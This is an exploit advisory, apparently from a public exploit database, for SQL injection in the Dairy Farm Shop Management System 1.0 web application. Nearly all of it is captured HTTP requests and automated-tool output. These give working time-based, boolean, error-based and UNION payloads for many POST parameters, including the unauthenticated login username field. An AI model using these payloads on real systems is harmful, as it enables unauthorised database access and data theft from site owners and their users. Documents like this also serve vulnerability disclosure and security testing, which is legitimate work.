# Exploit Author: Chris Inzinga
# Vendor Homepage: https://phpgurukul.com/
# Software Link: https://phpgurukul.com/dairy-farm-shop-management-system-using-php-and-mysql/
# Version: v1.0
# Tested on: Windows
# CVE: N/A

# The Dairy Farm Shop Management System 1.0 web application is vulnerable to 
# SQL injection in multiple areas. The most severe of these is the username 
# parameter on the login page as this injection can be done unauthenticated.


================================ &#039;username&#039; - SQLi ================================

POST /dfsms/index.php HTTP/1.1
Host: 192.168.0.33
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.0.33/dfsms/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Connection: close
Cookie: PHPSESSID=ogvk4oricas9oudnb7hb88kgjg
Upgrade-Insecure-Requests: 1

username=test&password=test&login=

---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test&#039; AND (SELECT 5667 FROM (SELECT(SLEEP(5)))mKGL) AND &#039;UlkV&#039;=&#039;UlkV&password=test&login=
---
[INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12



================================ &#039;category&#039; & &#039;categorycode&#039; - SQLi ================================

POST /dfsms/add-category.php HTTP/1.1
Host: 192.168.0.33
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.0.33/dfsms/add-category.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Connection: close
Cookie: PHPSESSID=ogvk4oricas9oudnb7hb88kgjg
Upgrade-Insecure-Requests: 1

category=test&categorycode=test&submit=

---
Parameter: category (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: category=test&#039; AND (SELECT 8892 FROM (SELECT(SLEEP(5)))WzFH) AND &#039;NELe&#039;=&#039;NELe&categorycode=test&submit=
---
[INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12

---
Parameter: categorycode (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: category=test&categorycode=test&#039; AND (SELECT 9140 FROM (SELECT(SLEEP(5)))bzQA) AND &#039;izaK&#039;=&#039;izaK&submit=
---
[INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12



================================ &#039;companyname&#039; - SQLi ================================

---
Parameter: companyname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: companyname=test&#039; AND (SELECT 7565 FROM (SELECT(SLEEP(5)))znna) AND &#039;bEUm&#039;=&#039;bEUm&submit=
---
[INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12



================================ &#039;productname&#039; & &#039;productprice&#039; - SQLi ================================

---
Parameter: productname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: category=Milk&company=Amul&productname=test&#039; AND (SELECT 1171 FROM (SELECT(SLEEP(5)))rlQI) AND &#039;RgaN&#039;=&#039;RgaN&productprice=test&submit=
---
---
Parameter: productprice (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: category=Milk&company=Amul&productname=test&productprice=test&#039; AND (SELECT 8940 FROM (SELECT(SLEEP(5)))BRuk) AND &#039;Imqh&#039;=&#039;Imqh&submit=
---
[INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12



================================ &#039;fromdate&#039; & &#039;todate&#039; - SQLi ================================

---
Parameter: todate (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: fromdate=2020-01-05&todate=-6737&#039; OR 3099=3099#&submit=

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: fromdate=2020-01-05&todate=2020-01-31&#039; OR (SELECT 3665 FROM(SELECT COUNT(*),CONCAT(0x7162766271,(SELECT (ELT(3665=3665,1))),0x716a7a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- mqby&submit=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: fromdate=2020-01-05&todate=2020-01-31&#039; AND (SELECT 5717 FROM (SELECT(SLEEP(5)))adaE)-- cLAK&submit=

    Type: UNION query
    Title: MySQL UNION query (NULL) - 5 columns
    Payload: fromdate=2020-01-05&todate=2020-01-31&#039; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162766271,0x666369456150614b454a4f51454e6e687449724a786445585455515a67614162754545716d476f6f,0x716a7a7171),NULL#&submit=

Parameter: fromdate (POST)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: fromdate=2020-01-05&#039; AND (SELECT 7128 FROM(SELECT COUNT(*),CONCAT(0x7162766271,(SELECT (ELT(7128=7128,1))),0x716a7a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Tzxh&todate=2020-01-31&submit=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: fromdate=2020-01-05&#039; AND (SELECT 7446 FROM (SELECT(SLEEP(5)))Aklw)-- uzkF&todate=2020-01-31&submit=
---



================================ &#039;mobilenumber&#039; & &#039;emailid&#039; & &#039;adminname&#039; - SQLi ================================

---
Parameter: emailid (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: adminname=Admin&username=admin&emailid=admin@test.com&#039; AND (SELECT 5884 FROM (SELECT(SLEEP(5)))EgFJ) AND &#039;kFGt&#039;=&#039;kFGt&mobilenumber=1234567899&update=
---
---
Parameter: adminname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: adminname=Admin&#039; AND (SELECT 5969 FROM (SELECT(SLEEP(5)))vpfG) AND &#039;kOJS&#039;=&#039;kOJS&username=admin&emailid=admin@test.com&mobilenumber=1234567899&update=
---
---
Parameter: mobilenumber (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: adminname=Admin&username=admin&emailid=admin@test.com&mobilenumber=1234567899&#039; AND (SELECT 1163 FROM (SELECT(SLEEP(5)))rdwj) AND &#039;mnwu&#039;=&#039;mnwu&update=
---

